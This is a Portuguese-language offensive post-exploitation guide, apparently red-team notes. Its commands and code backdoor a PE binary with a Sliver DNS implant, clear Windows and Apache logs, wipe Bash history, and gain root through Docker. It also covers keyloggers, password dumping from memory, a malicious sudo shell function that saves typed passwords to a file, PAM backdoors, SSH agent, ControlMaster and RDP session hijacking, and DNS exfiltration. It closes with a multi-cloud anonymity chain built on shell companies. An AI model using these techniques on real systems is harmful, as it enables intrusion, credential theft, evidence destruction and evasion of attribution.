Aqui, vamos juntar tudo: nossos mecanismos de persistência fornecidos com nosso canal de comando e controle de fallback. Nosso objetivo é configurar um agente Sliver como um canal de persistência de longa distância, a partir de um executável já confiável e persistido.
A partir dessa sessão DNS persistida, podemos migrar para outra sessão operacional, para
ajudar a nos desassociar do nosso mecanismo de persistência.

Já devemos ter nosso DNS configurado a partir da seção DNS C2.

- você pode ver um exemplo de config de dns aqui na doc do sliver https://sliver.sh/docs?name=DNS+C2

Em seguida, precisamos startar o listner dns e gerar um perfil de payload para o DNS C2, pois o usaremos para criar um backdoor em um arquivo de destino para persistência. 

Quando injetamos nosso backdoor de DNS em um arquivo PE, faremos isso a partir de uma sessão ja existente... Nosso novo perfil de backdoor pode ser especificado usando as seguintes configurações:

```create-profile --dns 1.example.com. --timeout 360 -a 386 --profile-name dns-profile```

Depois de localizar o diretório do aplicativo e o binário de destino, basta verificar suas permissões para editar o arquivo. Depois de localizar o diretório do aplicativo e o binário de destino, basta verificar suas permissões para editar o arquivo. Além disso, antes de editar o arquivo, você terá que encerrar o processo em execução, pois não é possível excluir e reescrever o arquivo enquanto ele estiver em execução no Windows. Também levar em consideração a arquitetura do binario.

Depois que tudo isso estiver pronto, nossas configurações de DNS tiverem sido configuradas e nosso perfil de implante tiver sido criado, podemos executar o seguinte comando em nossa sessão Sliver existente:

```backdoor --profile dns-profile "C:\`Path\To\Binario.exe"```


Depois de aplicar o backdoor a este arquivo, na próxima vez que este binario for reiniciado de alguma forma, você terá sua sessão dns em execução.


- https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
- https://www.bleepingcomputer.com/news/security/certutilexe-could-allow-attackers-to-download-malware
- https://x.com/notwhickey/status/1333900137232523264
- https://powersploit.readthedocs.io/en/latest/Privesc/Find-PathDLLHijack/
- https://github.com/Binject/binjection


## Active Manipulation
>___


Ao encontrar seu oponente, você pode interferir no oponente antes que ele perceba sua presença , você pode prejudicar ainda mais a capacidade dele de detectar sua existência. Isso pode ser arriscado mas pode gerar grandes dividendos quando executado com sucesso. 

• Deleting logs
• Backdooring frameworks
• Rootkits

Ao remover os logs do defensor e adulterar suas ferramentas, podemos prejudicar severamente a capacidade do defensor de detectar e responder ao evento.


### Clearing logs

Vamos começar analisando a limpeza de algumas de nossas atividades anteriores no Windows. Digamos que você tenha acessado um host Windows como um invasor e perceba que ele está bem equipado para produzir logs locais. 
Como um invasor, queremos remover alguns de nossos eventos específicos dessas fontes de log antes que os defensores possam analisá-los. Primeiro, é extremamente importante entender se os defensores centralizaram o log e, em seguida, potencialmente desabilitar essa coleção de logs.

Como o log de eventos pode ser um formato de arquivo tão complexo, podemos aprender com o fantástico projeto Eventlogedit, by 3gstudent, para entender várias dessas técnicas de uma perspectiva ofensiva.

A série de posts do blog 3gstudent mostra várias técnicas e implementações para obter acesso ao arquivo de log de eventos do Windows de um sistema em execução e modificar o arquivo assim que for possível gravar nele.

O projeto do 3gstudent é principalmente uma poc baseada no material do EquationGroup, explorando diversos procedimentos na mesma técnica geral. Para nossas operações reais, usaremos uma versão mais testada e pronta para uso em produção da técnica do QAX-A-Team, o EventCleaner.

O EventCleaner funciona de maneira muito semelhante à prova de conceito do 3gstudent, pois usa a API do Windows para omitir o log de destino e reescrever o arquivo. 

Uma técnica situacionalmente melhor é suspender ou até mesmo travar o serviço de log de eventos antes das suas ações alvo, de forma que os logs não estejam lá em primeiro lugar:

```
> EventCleaner.exe suspend
> EventCleaner.exe closehandle
> EventCleaner.exe [Target EventRecordID]
> EventCleaner.exe normal
```

Outra maneira potencialmente melhor de interromper o serviço de log de eventos é travar o serviço, pois isso parecerá menos suspeito do que suspender o processo. Há uma ótima postagem de blog de Benjamin Lim que descreve a trava do serviço de log de eventos chamando advapi32.dll!ElfClearEventLogFileW com um identificador de advapi32.

Felizmente para nós, essa técnica exata já foi implementada em um projeto em C# por Justin Bui (https://github.com/slyd0g/SharpCrashEventLog/blob/main/SharpCrashEventLog/Program.cs#L15). 

Para levar esse conceito de adulteração de log e serviço ainda mais longe, você também pode adulterar quaisquer agentes EDR que possam estar no host. Se você descobrir que seu alvo está usando um agente específico, precisará pesquisar técnicas que funcionem contra esse agente específico antes de tentar coisas no host.

Tentar técnicas aleatórias no host, quando você não tem certeza se funcionarão, é frequentemente chamado de "flailing" e não é algo que hackers experientes devem fazer.

- https://github.com/VladRico/apache2_BackdoorMod
- https://github.com/shellntel-acct/backdoors
- https://github.com/3gstudent/Eventlogedit-evtx--Evolution
- https://github.com/QAX-A-Team/EventCleaner
- https://limbenjamin.com/articles/crash-windows-event-logging-service.html


### Hybrid approach

Também podemos adulterar logs no Linux ou em um ambiente de produção. No Linux, a maioria dos arquivos de log são arquivos de texto simples armazenados em /var/log/. Para começar, usaremos um método semelhante ao anterior, em que essencialmente copiamos um log com nossa entrada específica omitida.

Como exemplo, digamos que encontramos uma vulnerabilidade na web que exploramos para obter acesso ao sistema Linux; podemos querer limpar os logs da web após obter acesso a esse sistema. Os seguintes comandos removerão todas as ocorrências de um endereço IP específico do log de acesso à web do Apache com um simples comando grep:

```
$ egrep -v "172.31.33.7" /var/log/apache2/access2.log > /var/log/
apache2/tmp.log;

$ mv /var/log/apache2/tmp.log /var/log/apache2/access2.log;
```

No entanto, isso ainda pode ser estranho do ponto de vista da análise, pois pode mostrar inconsistências nos logs do aplicativo. Uma técnica ofensiva melhor pode ser instalar um backdoor especial que omitirá certos logs em vez de excluí-los retrospectivamente. 

... nosso objetivo é sequestrar e manipular a funcionalidade normal do serviço; no entanto, desta vez, conseguiremos isso instalando um módulo no Apache no Linux. 

Para o nosso exemplo, utilizaremos o apache2_BackdoorMod de Vlad Rico. Uma desvantagem de usar essa ferramenta e técnica é que, se o defensor listar osmódulos carregados, ele poderá ver claramente os nomes e os módulos carregados, incluindo o nosso módulo malicioso.

Portanto, como invasor, você provavelmente desejará renomear seus módulos e backdoors para que se misturem a outros módulos existentes.


### Rootkits

Rootkits são o método definitivo para adulterar a percepção da oposição. Existem muitos tipos diferentes de rootkits, desde rootkits userland até rootkits kernel-land.

Nesta seção, vamos nos concentrar em um rootkit LKM do Linux. LKM significa Loadeble Kernel Module, que é como o rootkit é instalado.

Para o nosso exemplo, vamos nos concentrar no Reptile. O Reptile possui um conjunto de recursos bastante básico: ele pode ocultar diretórios, arquivos, conteúdo dentro de arquivos, processos e até mesmo conexões de rede.

Reptile faz uso intenso do framework khook e do loader kmatryoshka. O Reptile usa o framework khook para tornar o hooking API calls do kernel muito mais fácil.
O programa kmatryoshka é um loader criptografado projetado como um módulo do kernel. Ele é a base para o LKM, consistindo em duas partes: um loader parasita e o código userland, chamado de parasita, a ser carregado na memória.

O Reptile também utiliza vários programas do ambiente de usuário, como reptile_cmd, que atuam como controles para permitir que o operador ative e desative recursos do LKM dinamicamente.


As vezes, esses rootkits podem exigir um pouco de memorização ou manter um runbook à mão, poisos diretórios e arquivos também serão ocultados do operador enquanto o backdoor estiver habilitado. 

- https://github.com/f0rb1dd3n/Reptile
- https://dk72njlsmbogubz637bkapyxvm--www-cnblogs-com.translate.goog/likaiming/p/10970543.html
- https://attack.mitre.org/techniques/T1014/




## Real-Time Conflict
>___


### Situational awareness

Neste capítulo, daremos uma olhada mais operacional, tentando entender quais usuários, conexões, aplicativos e privilégios podemos explorar como invasores, especialmente no contexto de abusar de outros usuários em tempo real. Podemos ver algumas dessas técnicas de reconhecimento aplicadas ao Windows com a ferramenta Seatbelt. 

- https://github.com/GhostPack/Seatbelt

O Seatbelt pode verificar muitos aplicativos antivírus comuns, quaisquer políticas aplicadas do AppLocker, políticas de auditoria, GPOs locais, configurações do Windows Defender, configurações do Firewall do Windows, políticas do Sysmon e muitas outras configurações.
Além da operational awareness, o Seatbelt também pode detectar histórico de comandos,
serviços, downloads e até mesmo conexões de rede comuns. 

Como um usuário sem privilégios no Linux, podemos também aproveitar uma ferramenta interessante chamada pspy para entender os processos em execução, o que nos dará muitas informações sobre quaisquer aplicativos defensivos que possam estar em execução no host[3]. O pspy faz isso monitorando alterações na lista de processos, no sistema de arquivos proc e em outros eventos críticos do sistema de arquivos por meio da API inotify. 

- https://github.com/DominicBreuker/pspy

#### Clear the Bash history

Unilateralmente, uma das primeiras coisas que você vai querer fazer antes de deixar um sistema
é limpar o histórico do Bash e zerá-lo para que ele não registre suas atividades.

Você deve sempre verificar antes de unset ou limpá-la, pois às vezes as senhas podem ser obtidas do histórico do Bash. Desabilitar o histórico do Bash é tão simples quanto unset a localização do arquivo de histórico nas variáveis de ambiente do shell:

```
# disable
$ unset HISTFILE

#clear
$ history -c
```

Podemos garantir que, sempre que iniciarmos um novo shell, não deixaremos o histórico:

```
$ echo "unset HISTFILE" >> ~/.bash_profile; echo "unset HISTFILE" >> ~/.bashrc;
```

Outra maneira de fazer isso é limpar o histórico automaticamente quando fazemos logout, assim:

```
$ echo 'history -c' >> ~/.bash_logout
```

Òutra trick é usar um espaço antes do seu comando, e ele não será registrado com a seguinte opção:

```
$ HISTCONTROL=ignoredups:ignorespace
```


#### Abusing Docker

Este é mais um hack de produção, já que uma máquina de produção tem maior probabilidade de estar executando contêineres. Dito isso, também vi muitas pessoas executando o Docker em suas estações de trabalho e, muitas vezes, persistentemente, quando se esquecem de que o serviço
está em execução. 

Se encontrarmos o Docker em execução no host de destino e estivermos no grupo Docker, podemos usá-lo para obter acesso root na máquina usando uma ferramenta como o dockerrootplease (https://github.com/chrisfosterelli/dockerrootplease). Basta baixar a imagem, executá-la e, ao desconectar, você obterá um shell de root:

```
$ docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
```

O Docker não é uma verdadeira máquina virtual ou sandbox, e frequentemente há maneiras de escapar de uma instância do Docker e escalar privilégios. Se você estiver
em uma instância do Docker em vez de no host nativo, poderá tentar escapar de várias maneiras... uma ferramenta realmente boa para explorar esses escapes é chamada DEEPCE (Docker
Enumeration, Escalation of Privileges and Container Escapes).

- https://github.com/stealthcopter/deepce


### Gleaning operational information

Nesta seção, abordaremos como roubar segredos de outros usuários na mesma máquina, além de apenas ver o que eles estão fazendo. Essas técnicas se tornam ainda mais poderosas se você puder roubar segredos de um administrador, acessar um ambiente seguro por meio de uma jumpbox ou acessar aplicativos administrativos.


#### Keylogging

Existem várias maneiras de implementar isso, então, para começar, veremos algumas técnicas diferentes no Linux.

A primeira ferramenta que veremos é chamada simple-key-logger. Essa técnica funciona bem em um ambiente tradicional, mas é importante entender que algo assim não funcionará com pseudoterminais, como aqueles via SSH.  No entanto, quando direcionado a máquinas físicas ou ambientes de desktop, o simple-key-logger faz maravilhas. 

Depois de construir o keylogger, você o invoca especificando o arquivo de saída
para salvar os keylogs:

```
$ sudo ./skylogger -l /tmp/lzao
```

Outra opção útil para keyloggers em um ambiente desktop Linux ou em um ambiente com interface gráfica de usuário X11 é o xspy. Podemos obter ainda mais informações de ambientes Linux locais e remotos com o xspy.

- https://github.com/mnp/xspy

Dito isso, esta ferramenta pode demorar um pouco para gravar no log com o buffer X11. Mas este é um bom keylogger quando há um XDisplay ou ambiente desktop no Linux, pois fornece muitas informações sobre as várias teclas que estão sendo pressionadas, mesmo quando essas teclas não estão sendo interpretadas por nenhum aplicativo específico.

Para roda-lo remotamente em um usuário executando uma sessão XDisplay, você precisa definir a variável DISPLAY primeiro e, em seguida, invocá-la assim:

```
$ sudo DISPLAY=localhost:10 ./xspy
```


Other options are: 

- keylogg with ssh session file https://jms1.net/ssh-record.shtml
- keylogg with shell wrapper golang tool (rootsh https://github.com/dsaveliev/rootsh)
- windows WireTap tool https://github.com/djhohnstein/WireTap


#### Screeshot spy

Semelhante ao WireTap, precisamos nos perguntar se podemos coletar gravações de tela no Linux.
Isso é um pouco menos prático se estivermos visando sistemas de produção (porque, novamente,
eles precisam de um ambiente de desktop), mas ainda é um conjunto de recursos realmente poderoso, que podemos abordar rapidamente. 

Para esse propósito, a equipe de segurança do CCDC escreveu uma ótima ferramenta multiplataforma, que eu operacionalizei como GoRedSpy.

- https://github.com/ahhh/GoRedSpy

O GoRedSpy não apenas tira capturas de tela do ambiente de trabalho, mas também as marca d'água com o IP público do servidor e um carimbo de data/hora. Acho essa ferramenta particularmente útil para coletar informações de reconhecimento de muitas máquinas simultaneamente, semelhante à forma como ferramentas como o EyeWitness são usadas para reconhecimento de rede, exceto que estou coletando reconhecimento dos hosts que já comprometi. 

O GoRedSpy pode ser configurado tanto na origem quanto na vítima quando invocado, onde o operador pode especificar o local de armazenamento das capturas de tela, o intervalo em que as capturas de tela são feitas e quantas capturas de tela devem ser coletadas. Isso é útil se você quiser fazer muitas capturas de tela rapidamente, para ver o uso detalhado de um aplicativo ou se quiser fazer algumas capturas de tela todos os dias ao longo de meses, para não encher a máquina da vítima com imagens.

```
$ goredspy -outDir /tmp/ssc/ -count 120 -delay 1800s
```


#### Getting passwords

No Linux, uma opção para obter senhas do sistema local é um aplicativo
chamado Linikatz. O Linikatz se inspira bastante no Mimikatz, embora tenha como alvo diversos aplicativos específicos de rede. 
Tive menos sucesso com esta ferramenta, principalmente porque ela tem como alvo aplicativos que conectam o Linux a uma infraestrutura do Active Directory, como VAS AD, SSSD AD, PBIS AD, FreeIPA AD, Samba e Kerberos.
Nos poucos exemplos em que vi isso, eles usaram uma conta de administrador de domínio para fazer com que cada máquina Linux ingressasse no domínio dessa forma, o que criou uma vulnerabilidade interessante para os atacantes.

No Linux, podemos tentar obter senhas da memória de outras maneiras usando o MimiPenguin. O MimiPenguin é semelhante ao Mimikatz, pois pesquisa o espaço de processo de muitos aplicativos que armazenam senhas na memória. Embora seja uma ótima ideia, ela é um pouco limitada, pois visa apenas aplicativos e implementações específicas, como vsftpd, LightDM, GNOME Keyring, GNOME Display Manager, Apache2 e até mesmo senhas OpenSSH. Da mesma forma, se a defesa conseguir acesso ao ambiente do invasor e estiver executando o Kali Linux, isso cria uma boa oportunidade para obter algumas das credenciais do invasor.

Também podemos usar o 3snake para extrair senhas da memória, diretamente do sshd. Essa ferramenta é muito boa, pois é um scanner de memória bastante preciso, e o SSH é um protocolo de administração remota onipresente no Linux. 

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/
- https://github.com/CiscoCXSecurity/linikatz
- https://github.com/huntergregal/mimipenguin
- https://github.com/blendin/3snake


#### Searching files for secrets

O GoRedLoot (GRL) é uma ferramenta multiplataforma para fazer exatamente isso. O GoRedLoot pode ser considerado um grep altamente avançado. O GRL considera nomes de arquivos e conteúdo para incluir e excluir de suas buscas, de modo que você possa procurar por conteúdo específico enquanto considera falsos positivos.
Além disso, o GoRedLoot compacta e criptografa esses arquivos na memória e, em seguida, grava seu conteúdo preparado em um local escolhido pelo invasor. 

E podemos chamar essa ferramenta (ou injetá-la na memória) da seguinte forma no sistema da vítima:

```
$ ./GoRedLoot /home/ /tmp/initram
```

Também podemos usar ferramentas semelhantes do Windows da SharpCollection, como SharpDir, SharpShare e SharpFiles, se estivermos procurando uma solução específica para Windows.

- https://github.com/ahhh/goredloot
- https://github.com/Flangvik/SharpCollection


#### Backdooring password utilities

Existe um truque bem antigo para obter a senha de um usuário, mesmo que você não tenha root em um sistema. Por exemplo, se você tiver acesso a uma conta de usuário e esse usuáriopuder usar o sudo, mas você não souber a senha dele e quiser usá-la, você pode usar funções maliciosas do Bash para fazer backdoor no usuário. Queremos colocar essa função maliciosa no ~/.bashrc


```sh
function sudo () {
	realsudo="$(which sudo)"
	read -s -p "[sudo] password for $USER: " inputPasswd
	printf "\n"; printf '%s\n' "$USER : $inputPasswd\n" >> /var/tmp/hlsb
	$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1
	$realsudo "${@:1}"
}
```

- https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194

#### PAM modules

O núcleo da maioria das autenticações Unix é gerenciado por um framework chamado PAM. PAM é um sistema antigo, de aproximadamente 1995, que significa pluggable authentication
modules. O framework PAM também existe no macOS, e técnicas semelhantes podem funcionar nele. 

Podemos adicionar um backdoor ao framework PAM. Podemos usar o pambd como um bom exemplo de um módulo simples que podemos adicionar ao nosso sistema de destino.

- https://github.com/segmentati0nf4ult/linux-pam-backdoor
- https://github.com/eurialo/pambd
- https://x-c3ll.github.io/posts/PAM-backdoor-DNS/

## Pivoting
>___


#### SSH agent hijacking

No ssh frequentemente há um programa adicional conhecido como SSH Agent, projetado para manter as conexões abertas por um período prolongado sem necessidade de reautenticação. Um recurso do SSH Agent é conhecido como SSH Agent Forwarding, ou ForwardAgent, usado para encadear conexões SSH de uma forma que não exija que o administrador mova sua chave privada para cada host antes do próximo salto.

Como um invasor, se você puder comprometer um bastião ou algo que as pessoas estejam usando, você pode abusar do SSH Agent Forwarding para pegar carona nessas mesmas conexões através do bastião e entrar no ambiente seguro.

É importante ter em mente que essas técnicas de pós-exploração exigem acesso root, para que possamos pesquisar na memória de processos de outros usuários e acessar o socket do agente SSH.

Outra técnica mais simples é que podemos pesquisar recursivamente a localização dos sockets SSH em /tmp/:

```$ sudo find /tmp/ -name "agent*" -print```

Também precisamos obter a localização do servidor para o qual estamos tentando pivotar, o que pode ser feito com:

```$ sudo lsof -i -n | egrep '\<ssh\>'```

Assim que encontrarmos um soquete SSH e o local de destino, podemos aproveitá-lo para pivotar para o mesmo host com o seguinte:

```# SSH_AUTH_SOCK=/tmp/ssh-rando16195/agent.16195 ssh victim@remotehost```

Você também pode ver o nome da chave e sua localização original listando-a com o utilitário do Agente SSH ssh-add, assim:

```# SSH_AUTH_SOCK=/tmp/ssh-rando16195/agent.16195 ssh-add -l```


- https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/


#### SSH ControlMaster hijacking

Uma técnica ligeiramente diferente do SSH agent hijacking é o ControlMaster hijacking. A multiplexação SSH, ou SSH ControlMaster, é uma configuração SSH avançada que permite a configuração de um soquete especial para comandos SSH de longo prazo ou múltiplos. Isso é feito principalmente por meio de um recurso chamado ControlMaster para abrir um soquete de longo prazo para muitas conexões SSH subsequentes passarem. 

Podemos abusar desse recurso como um atacante para pivotar ou obter acesso remoto aos mesmos hosts por meio desses sockets. Primeiro, começamos pesquisando para ver se o ControlMaster está habilitado.

Queremos procurar as palavras-chave SSH ControlMaster em todos os locais possíveis de configuração do cliente SSH:

```$ sudo grep -r "ControlPath" /home/ /root/ /etc/ssh/```

Assim que encontrarmos a localização de quaisquer sockets SSH ControlMaster, podemos aproveitar essas conexões com o seguinte, que obterá seu path a partir da saída do comando anterior:

```$ ssh -S /tmp/victim@remotehost```


Além disso, um invasor também pode definir essa configuração em uma máquina que ele explora
de forma que todos os hosts abram uma porta de controle SSH sobre a qual ele pode fazer pivot. Essa é uma ótima técnica para abusar de um jump box multiusuário e obter mais acesso a partir dele. 
Outro cenário em que isso pode ser realmente útil é quando chaves SSH são usadas e você chega ao host antes do usuário que deseja explorar. Caso senhas sejam usadas em vez de chaves, podemos aproveitar muitas das técnicas de scraping de memória e backdoors de autenticação acima.

- https://www.anchor.com.au/blog/2010/02/ssh-controlmaster-the-good-the-bad-the-ugly/
- https://0xicf.wordpress.com/2015/03/13/hijacking-ssh-to-inject-port-forwards/

#### RDP hijacking

No RDP hijacking, você precisará de permissões em nível de sistema e poderá
usar o utilitário de sistema tscon para sequestrar quaisquer sessões RDP existentes no sistema. 
Para fazer isso, você precisa primeiro obter o nome da sessão e o ID das sessões que deseja
sequestrar. Isso pode ser feito com uma simples consulta user no Windows. Podemos aproveitar
isso no Windows como um Administrador Local usando sc, o gerenciador de controle de serviços,
para obter permissões em nível de sistema, como demonstrado por Alexander Korznikov
originalmente:

```
> query user

> sc create ses binpath="cmd.exe /k tscon [victim ID] /dest:[your
SESSIONNAME]" > net start ses
```
- https://www.youtube.com/watch?v=OgsoIoWmhWw



## The Research Advantage
>___


### Creative Pivoting

Ao preparar qualquer tipo de campanha ofensiva avançada, você precisará construir um perfil geral e uma base de conhecimento do alvo. Quais são as principais operações de negócios, quem são os responsáveis, quem são os administradores e quais tecnologias eles utilizam? Essas informações são cruciais para a construção de qualquer ataque avançado de engenharia social ou mesmo para pivotar a rede. Muitas vezes, quando essas informações são utilizadas na elaboração de um ataque para se camuflar, elas são conhecidas como pretexto.

 Por fim, ao considerar maneiras de sair da rede alvo, procure o tráfego normal do sistema. Uma equipe vermelha criativa usará uma CDN pública, um serviço de compartilhamento de arquivos ou um ponto de endpoint comum que os usuários visitam com frequência, lembrando-se de se misturar ao tráfego da rede alvo.

 Investir tempo para entender se um túnel criptografado será um sinal de alerta ou uma proteção crucial para suas comunicações vale a pena no reconhecimento local. 


Awgh desenvolveu um pequeno utilitário de análise de rede chamado nfp, ou Network Finger Printer, que equipes vermelhas podem usar para obter estatísticas sobre uma rede antes de escolher quais protocolos usar para saída.


## Clearing the Field
>___


Encerrar uma operação é indiscutivelmente tão importante quanto iniciá-la. Planejar várias condições finais desde o início com manuais de estratégia pode ajudar sua equipe a atingir seus objetivos ao longo do conflito. Da perspectiva ofensiva, após uma operação, vocêirá querer limpar o ambiente para garantir que não seja pego ou atribuído a nenhuma violação. Caso você seja detectado, as operações ofensivas precisarão salvar o máximo possível das operações, seja aprofundando-se internamente ou queimando seu acesso e recuando do ambiente alvo. 

Você precisa se concentrar em uma resolução sólida ou no fim do conflito. Por exemplo, como invasor, depois de atingir seus objetivos, você pode queimar seu próprio acesso e deixar o ambiente limpo, minimizando ativamente qualquer evidência que deixe nele.


### Exfiltration

Obter dados de um ambiente alvo é tão importante quanto entrar no próprio ambiente. Ao planejar uma operação ofensiva, é importante planejar como obter as informações do alvo.


#### Protocol tunneling

Existem muitos protocolos de rede populares para exfiltração de dados, como SMTP, FTP e HTTPS, pois eles podem se esconder no tráfego normal da rede e também suportam transferências de arquivos grandes para exfiltração. Esses protocolos também incluem utilitários nativos do sistema para seu uso, o que significa que muitas vezes podem ser aproveitados sem ferramentas adicionais. 
Por exemplo, tanto os sistemas Windows quanto Linux vêm com um cliente FTP nativo que pode ser invocado a partir da linha de comando. Se esse arquivo for muito grande, você pode dividi-lo em vários pedaços, exfiltrar esses pedaços menores e reconstruir o arquivo na outra extremidade, usando uma ferramenta como o split no Linux.

Outro protocolo muito útil é o tunelamento de DNS. Podemos usar uma ferramenta ad hoc para este canal de exfiltração de DNS se não quisermos passar por um canal C2 existente. Uma ótima ferramenta para tunelamento de DNS ad hoc é o dnscat2, de Ron Bowes (https://github.com/ iagox86/dnscat2). O dnscat2 pode funcionar em modo autoritativo, usando o servidor DNS local e resolvendo hierarquicamente até encontrar o servidor de nomes do invasor. Ou pode apontar diretamente para o servidor dnscat2 do invasor, executando uma conexão DNS simulada, ainda fazendo uma conexão protocol-compliant.

Outro projeto é o PacketWhisper é um projeto interessante do TryCatchHCF que utiliza o DNS como um canal secreto e oculta os dados usando uma cifra de substituição para codificá-los em subdomínios aleatórios. O PacketWhisper utiliza outra ferramenta do TryCatchHCF, o kit Cloakify, para codificar os dados nos vários subdomínios.

- https://github.com/TryCatchHCF/PacketWhisper
- https://github.com/TryCatchHCF/Cloakify

### Anonymity networks

Às vezes, você precisa de mais anonimato do que apenas canais secretos ou tunelamento de protocolo. Se você se concentrou em proteger a identidade da organização atacante, pode querer uma rede de anonimato para aproveitar durante as várias fases do ataque ou mesmo apenas para exfiltrar dados.


#### Public networks

- tor
- pastebin

Ainda existem maneiras de extrair dados do Pastebin; por exemplo, projetos como o pystemon podem monitorar e extrair dados do Pastebin em busca de regexes[9]. Ele faz isso extraindo dados do arquivo de pastas carregadas recentemente e pesquisando suas entradas brutas diretamente, sem a API. Ele também suporta sites de extração de dados como slexy.org, gist.github.com, paste. org.ru, kpaste.net, ideone.com, pastebin.fr e pastebin.gr. Dito isso, muitos atacantes migraram para novos serviços de pasta, como 0bin.net, snippet.host e privatebin.info. 


#### Custom private anonymity networks

Frequentemente, os invasores precisam vir de vários endereços na internet para dificultar a identificação e o bloqueio do tráfego pelos defensores. Embora o Tor seja uma boa alternativa, é fácil identificar e bloquear em determinados ambientes

Em vez disso, os invasores precisam cobrir várias localizações geográficas e provedores de serviços para que não possam ser bloqueados simplesmente com base na origem ou na quantidade de dados que estão enviando ao alvo.

A infração precisa de uma maneira, especialmente fora de uma rede, de sondar a infraestrutura sem ser identificada antes do início da operação. Da mesma forma, se estiverem tentando extrair dados da rede, devem ter opções que não revelem a verdadeira infraestrutura do invasor.

Uma alternativa legal pode ser usar uma VPN ou rede proxy, que permite que invasores saiam de geolocalizações específicas ou até mesmo de tipos de provedores de serviço.

Embora exista um grande número de provedores de VPN por aí, mais recentemente, as pessoas têm recorrido a provedores de nuvem comuns para mascarar seu tráfego. O motivo é simples: a maioria dos lugares não bloqueia o tráfego proveniente de grandes provedores de nuvem. Além disso, a maioria dos provedores de VPN é categorizada como tal pela MaxMind, RiskIQ e outros serviços de inteligência de IP. Ainda mais perigoso para os invasores, algumas VPNs encerram contas em resposta a denúncias de abuso ou fornecem registros às autoridades para atribuição.

Alguns invasores também optam por usar bulletproof hosting ou bulletproof VPNs, que afirmam não manter registros do tráfego de seus clientes, mas, novamente, esses provedores de serviços são mais raros e mais fáceis de identificar de um ponto de vista defensivo.


- Isso levanta a questão: "Como você pode anonimizar seu tráfego por meio de um provedor de nuvem e se proteger do próprio provedor?" 

A resposta está em ofuscar o roteamento em nível de rede por meio de vários provedores de nuvem. É aqui que alguns grupos criam suas próprias redes de anonimato. Isso pode ser feito criando conexões de túnel criptografadas entre vários provedores de nuvem. 

Ao usar shell entities e passar apenas tráfego criptografado entre os provedores de nuvem, o invasor pode minimizar a capacidade do provedor de nuvem de gerar inteligência significativa contra o tráfego.

- Um exemplo disso é o seguinte:

```
1. The attacker buys a VPN(prime) with BTC from an anonymous VPN
provider.

2. Using VPN(prime), the attacker registers an account with Azure using shell
corporation(a) and email(a).

3. The attacker sets up two hosts in Azure: a tunnel and management host
(mgmt-a) and an OpenVPN server – VPN(a).

4. The attacker then hops through VPN(a) and registers an account on Google
Cloud using shell corporation(b) and email(b).

5. The attacker sets up two hosts in Google Cloud: a tunnel and management
host (mgmt-b) and an OpenVPN server – VPN(b).

6. The attacker creates a site-to-site VPN between VPN(a) and VPN(b) and sets
the default gateway to egress traffic out of VPN(b).

7. The attacker then hops through VPN(b) to register an account on Amazon
Web Services (AWS) using shell corporation(c) and email(c).

8. The attacker sets up two hosts in AWS: a tunnel and management host
(mgmt-c) and an OpenVPN server – VPN(c).

9. The attacker creates a site-to-site VPN between VPN(b) and VPN(c) and sets
the default gateway to egress traffic out of VPN(c).

10. The attacker uses cloud management CLIs in each of the environments to
block all traffic to the hosts, with the exception of the following rules:

1. Mgmt-a allows tcp/22 from 0.0.0.0/0 – this is used to update firewall
rule (b) below if it needs changing.
2. VPN(a) allows udp/1194 from VPN(prime)'s IP
3. Mgmt-b allows tcp/22 from mgmt-a.
4. VPN(b) allows udp/1194 from VPN(a)
5. Mgmt-c allows tcp/22 from mgmt-b
6. VPN(c) allows udp/1194 from VPN(b)
```

Dessa forma, nenhum provedor de serviços conhece a origem e o destino do tráfego. Semelhante ao Tor, qualquer nó deve ser capaz de descobrir apenas as conexões diretas de ambos os lados. Além disso, como o tráfego transmitido é criptografado (tipicamente HTTPS), até mesmo os túneis VPN subjacentes estão protegidos do monitoramento direto.


### Ending the operation

Toda operação ofensiva deve ter um objetivo e uma condição final, portanto, é melhor
planejar para esse objetivo. O próximo passo geralmente envolve a remoção de quaisquer ferramentas ou evidências restantes do ambiente. Independentemente da condição final, há várias etapas que os invasores devem seguir ao final de uma operação.


#### Taking down infrastructure

Remova qualquer infraestrutura pública assim que não precisar mais dela. Você também pode bloquear portas quando não estiver usando a infraestrutura operacionalmente. Você pode ir ainda mais longe restringindo as portas durante sua operação apenas ao espaço IP do seu alvo. 
Um grande motivo para limitar a disponibilidade pública da infraestrutura do seu invasor é que vários serviços de inteligência varrem a internet em busca desses serviços e categorizam seu espaço IP , domínios ou até mesmo ferramentas como maliciosos. 


Uma técnica para automatizar essa limpeza é incluir datas de eliminação em seu malware ou agentes, de forma que após uma determinada data, eles possam se autoexcluir ou parar de funcionar. O Gscript é uma ótima plataforma dropper porque você pode adicionar facilmente gscripts com uma data de eliminação a qualquer outra coleção de ferramentas ofensivas.

- https://github.com/ahhh/gscripts/blob/d66c791dc01d17a088144d902695e8b1508f03e4/anti-re/kill_date.gs